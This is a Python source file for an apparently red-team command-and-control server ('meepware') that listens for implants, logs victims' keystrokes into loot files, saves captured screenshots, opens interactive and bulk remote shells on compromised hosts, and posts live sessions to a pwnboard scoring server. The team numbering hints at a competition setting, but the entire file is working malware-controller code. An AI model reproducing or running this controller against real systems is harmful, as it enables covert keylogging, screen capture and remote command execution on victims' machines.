import socket
import _thread
import os
import time
import requests
from datetime import datetime
from PIL import Image
# TODO: writing command history to log files
# TODO: track live meeplogger connections
# c5: command control cabal chaos corrosive
# Next code words: "the potato manual", "just make c4", "bozu", "nil is goated", "that is actually woke"


# data structures for connected sessions
sessionsDict = {}
sessionsList = []
sessionsNames = []


def handler(handler_socket, addr):
    # thread started by each connection
    teamNo = str((int(str(addr[0]).split(".")[3]) + 6) // 8)
    # determine what kind of meepware is connecting via codewords
    connectionType = handler_socket.recv(2048).decode()

    if connectionType == "wire":
        print("\nMEEPLOGGERPLUS connection detected :)\n")
        make_loot(teamNo)
        meeplogger(handler_socket, addr, teamNo)
    elif connectionType == "based":
        print("\nMEEPLOGGERADVANCED connection detected :)\n")
        make_loot(teamNo)
        meeplogger(handler_socket, addr, teamNo)
    elif connectionType == "meepster":
        print("\nMEEPSHELL connection detected :)\n")
        add_session(handler_socket, addr, teamNo)
    elif connectionType == "chad":
        print("\nMEEPCUT dropped you a shell :)\n--thanks Brad\n")
        add_session(handler_socket, addr, teamNo)
    elif "yoink" in connectionType:
        print("\nScreening yoinking activated\n")
        make_loot(teamNo)
        meepyoink(handler_socket, addr, teamNo, connectionType[5:])
    else:
        print("Meepware not authenticated :(")
        print("attempted codeword: " + connectionType)


def meepyoink(connection, addr, teamNo, screen_size):
    # TO-DO find out why this needs to be scuffed
    screen_size = screen_size.split("_")
    screen_width = int(screen_size[0])
    screen_height = int(screen_size[1])
    dataLen = screen_height * screen_width * 3
    data = connection.recv(dataLen, socket.MSG_WAITALL)
    img = Image.frombytes('RGB', (screen_width, screen_height), data)
    name = f'Team_{teamNo}/Team_{teamNo}_{str(addr[0])}_{datetime.now().strftime("%H-%M-%S")}_yoink.png'
    try:
        img.save(name, 'PNG')
    except ValueError:
        print("Sockets = bad")
    connection.close()


def meeplogger(connection, addr, teamNo):
    # appends keys to loot file in unique directory
    current_directory = os.getcwd()
    uniq = "Team_" + str(teamNo)
    final_directory = os.path.join(current_directory, uniq)
    uniq += "_" + str(addr[1])
    try:
        while True:
            with open(final_directory + "/" + uniq + "_loot.txt", 'a+') as loot:
                temp = connection.recv(2048).decode() + "\n"
                # test print statement for incoming keys
                print("Incoming keys from: " + str(addr) + "\n" + temp)
                loot.writelines(temp)
                if temp == "\n":
                    print("Connection closed :(")
                    break
    except socket.error as e:
        print("\nERROR :(\nClosing connection to victim: " + str(addr) + "\nError:\n" + str(e))
        connection.close()
    except ConnectionResetError as e:
        print("\nERROR :(\nClosing connection to victim: " + str(addr) + "\nError:\n" + str(e))
        connection.close()


def shell(connection, addr):
    # sends commands and receives output from shells
    # enables session switching
    try:
        while True:
            command = input("\nEnter command to execute on " + str(addr[0]) + ":" + str(addr[1]) + ":\n")
            if command.upper() == "EXIT" or command == "":
                break
            connection.send(command.encode())
            output = connection.recv(2048).decode()
            print("\nOutput from " + str(addr[0]) + ":" + str(addr[1]) + ": \n")
            print(output)
    except Exception as e:
        print("\nERROR\nConnection lost :(\n")
        print(e)
        remove_dirs()
        remove_session(connection, addr)


def make_loot(teamNo):
    # create loot folder based on IP
    print("\nAttempting to create loot folder...")
    current_directory = os.getcwd()
    final_directory = os.path.join(current_directory, "Team_" + teamNo)
    if not os.path.exists(final_directory):
        os.makedirs(final_directory)
        print("\nLoot folder created :)\n")
    else:
        print("\nLoot folder already exists! :)\n")


def add_session(connection, addr, teamNo):
    # add session to data structures
    if addr not in sessionsDict:
        # get user@hostname (meepware sends username & hostname after code word)
        sessionsDict[addr] = connection
        temp = connection.recv(2048).decode()
        # change before deploy, teams will likely have the same hostnames
        # temp += " : Team #" + teamNo
        sessionsNames.append(temp + teamNo)
        sessionsList.append(addr)


def remove_dirs():
    for addr in sessionsDict:
        try:
            current_directory = os.getcwd()
            final_directory = os.path.join(current_directory, str(addr[0]) + "_" + str(addr[1]))
            os.rmdir(final_directory)
        except OSError:
            pass


# TODO make global dir/loot name format
# allow reuse through functions
# this function won't properly remove a directory
def remove_session(connection, addr):
    remove_dirs()
    # remove session from data structures
    try:
        # removes unique directory if empty for QoL
        current_directory = os.getcwd()
        final_directory = os.path.join(current_directory, str(addr[0]) + "_" + str(addr[1]))
        os.rmdir(final_directory)
    except OSError:
        pass
    sessionsDict.pop(addr)
    index = sessionsList.index(addr)
    sessionsNames.pop(index)
    sessionsList.pop(index)
    connection.close()


def sessions():
    # session switching handler
    # uses data structures to pass socket object & address tuple to shell function
    while True:
        if len(sessionsList) > 0:
            print("\nWhich session would you like to connect to?")
            for i in range(len(sessionsList)):
                try:
                    addr = sessionsList[i]
                    print(str(i+1) + " - " + str(addr[0]) + ":" + str(addr[1]) + " (" + sessionsNames[i] + ")")
                except:
                    pass
            try:
                selection = input()
                if selection[:4] == "BULK":
                    bulk_commands(selection[5:])
                elif int(selection) > len(sessionsList) or int(selection) <= 0:
                    print("Please choose a valid number")
                else:
                    shell(sessionsDict[sessionsList[int(selection) - 1]], sessionsList[int(selection) - 1])
            except TypeError:
                print("Please choose a valid number")
            except Exception as e:
                print("Please choose a valid number")
                print(str(e))

# TODO implement pwnboard integration in the agent or have agent send real IP with initial connection
def sessions_status():
    # pwnboard integration
    while True:
        if sessionsList:
            # if there are sessions stored
            for i in list(sessionsDict):
                # loop through all sessions
                try:
                    # try to get output from whoami
                    sessionsDict[i].send("whoami".encode())
                    sessionsDict[i].recv(2048).decode()
                    url = 'http://pwnboard.win/generic'
                    postData = {"ip": i[0], "type": "meepshell"}
                    # send data to pwnboard if it works
                    requests.post(url, json=postData)
                except:
                    # remove the session if it doesn't work
                    remove_session(sessionsDict[i], i)
        time.sleep(120)

# TODO add multithreading for this
def bulk_commands(command):
    if sessionsList:
        for i in sessionsList:
            try:
                sessionsDict[i].send(command.encode())
                print(sessionsDict[i].recv(2048).decode())
            except Exception as e:
                print('Error: ' + str(e))


def main():
    # create socket, set hostname (& convert to ip) and port
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    hostname = "" # add hostname/ip
    ip = socket.gethostbyname(hostname)
    # the 'meep' port
    # m = 13, e + e = 3 + 3 = 6, p = 16
    port = 13616

    # bind to port and listen
    s.bind((ip, port))
    s.listen(5)
    print("Listening for victims...\n\n")

    global sessionsDict, sessionsList, sessionsNames
    # start session handling/switching
    _thread.start_new_thread(sessions, ())

    # start checking if sessions are alive
    _thread.start_new_thread(sessions_status, ())

    # loop listens for new victims and starts thread for each connection
    while True:
        client_socket, address = s.accept()
        print("\nNEW VICTIM from: " + repr(address))

        _thread.start_new_thread(handler, (client_socket, address))
        print("\nListening for victims...\n")


if __name__ == '__main__':
    main()